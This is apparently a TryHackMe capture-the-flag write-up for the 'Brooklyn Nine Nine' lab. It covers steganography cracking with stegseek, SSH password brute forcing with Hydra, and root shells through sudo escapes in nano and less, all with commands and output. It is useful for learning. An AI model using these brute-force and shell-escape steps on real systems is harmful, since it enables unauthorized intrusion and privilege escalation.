---
title: Brooklyn Nine Nine
description: 'Steganography and a GTFOBin for Nano and Less'
pubDate: 2024-08-26
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg'
---

In the source of the page we there is a comment mentioning steganography.

So lets grab the only image we have so far:

```bash
wget http://10.10.206.220/brooklyn99.jpg
```

We don't have a password for it and `binwalk` or `exiftool` doesn't give extra much info.

## USER holt

Looking at the nmap scan we see that anonymous access to FTP.
On the FTP there is only 1 file (`note_to_jake.txt`) mentioning something about a weak password.
So maybe we can just brute force the password for the image we have.

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

In `brooklyn99.jpg.out` there is an SSH user and password.

```bash
ssh holt@10.10.206.220 # <-- fluffydog12@ninenine
```

## ROOT holt

Once logged we can check the sudo rights since we have the users password:

```bash
sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

This seems pretty straight forward to exploit thanks to GTFOBins (https://gtfobins.github.io/gtfobins/nano/#shell):

```bash
sudo /bin/nano
```

Now in Nano we do:

```
^R^X
reset; sh 1>&0 2>&0
```

This gives us a root shell.


### USER jake

Since its mentioning the user jake with a weak password we can try a brute force on SSH with that user.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.206.220 ssh -t 4
...[snip]...
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.206.220   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
...[snip]...
```

## ROOT jake

Checking our sudo permissions we see we can execute `less`.

```bash
 sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Lets check GTFOBins (https://gtfobins.github.io/gtfobins/less/#shell) to see how to exploit this.

```bash
sudo /usr/bin/less /etc/profile
```

Now in Less:

```
!/bin/sh
```

This gives us a root shell.
